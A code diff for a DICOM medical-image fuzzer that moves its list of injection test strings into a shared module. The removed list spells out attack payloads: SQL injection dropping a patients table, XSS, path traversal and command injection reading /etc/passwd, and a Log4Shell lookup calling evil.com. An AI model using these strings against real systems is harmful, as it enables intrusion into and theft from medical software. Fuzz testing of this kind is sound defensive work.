@@ -26,27 +26,9 @@ from pydicom.dataset import Dataset
 from dicom_fuzzer.utils.logger import get_logger
 
 from .base import FormatFuzzerBase
+from .dicom_dictionaries import INJECTION_PAYLOADS
 
 logger = get_logger(__name__)
-
-# Injection payloads that might appear in metadata fields
-_INJECTION_PAYLOADS = [
-    "'; DROP TABLE patients; --",
-    "<script>alert('XSS')</script>",
-    "../../etc/passwd",
-    "${jndi:ldap://evil.com/a}",
-    "%s%s%s%s%s%s%s%s%s%s",
-    "{{7*7}}",
-    "\x00\x00\x00\x00",
-    "A" * 10000,
-    "\r\nInjected-Header: value",
-    "| cat /etc/passwd",
-    "$(touch /tmp/pwned)",
-    "&lt;img src=x onerror=alert(1)&gt;",
-    "UNION SELECT * FROM users",
-    "\x1b[31mRED\x1b[0m",
-    "\\\\server\\share\\path",
-]
 
 # Malformed Person Name (PN) values
 # DICOM PN format: alphabetic^ideographic^phonetic, each with up to 5 components
@@ -197,7 +179,7 @@ class MetadataFuzzer(FormatFuzzerBase):
                     "ID WITH SPACES",
                     "ID\x00HIDDEN",  # Null byte
                     "PAT-" + "9" * 100,  # Extreme length
-                    *_INJECTION_PAYLOADS[:5],
+                    *INJECTION_PAYLOADS[:5],
                     "0" * 64,  # Max length numeric
                     "ID\tTAB\tSEPARATED",  # Tab characters
                     "PATIENT\\ID\\BACKSLASH",  # Backslashes
@@ -301,7 +283,7 @@ class MetadataFuzzer(FormatFuzzerBase):
                     "",  # Empty
                     "S" * 17,  # Over 16-char SH limit
                     "STUDY\x00ID",  # Null byte
-                    *_INJECTION_PAYLOADS[:3],
+                    *INJECTION_PAYLOADS[:3],
                     "12345678901234567",  # 17 chars
                     "STUDY WITH SPACES AND MORE TEXT",  # Long with spaces
                 ]
@@ -313,7 +295,7 @@ class MetadataFuzzer(FormatFuzzerBase):
                     "",  # Empty
                     "A" * 17,  # Over 16-char SH limit
                     "ACC\x00NUM",  # Null byte
-                    *_INJECTION_PAYLOADS[:3],
+                    *INJECTION_PAYLOADS[:3],
                     "0" * 16,  # Max length numeric
                     "ACC-2025-" + "9" * 50,  # Overlong realistic format
                 ]
@@ -450,7 +432,7 @@ class MetadataFuzzer(FormatFuzzerBase):
         if attack_type == "malformed":
             return random.choice(_PN_ATTACKS)
         elif attack_type == "injection":
-            payload = random.choice(_INJECTION_PAYLOADS)
+            payload = random.choice(INJECTION_PAYLOADS)
             prefix = random.choice(["Dr.", "Smith^", "Patient^", ""])
             return f"{prefix}{payload}"
         else:  # boundary
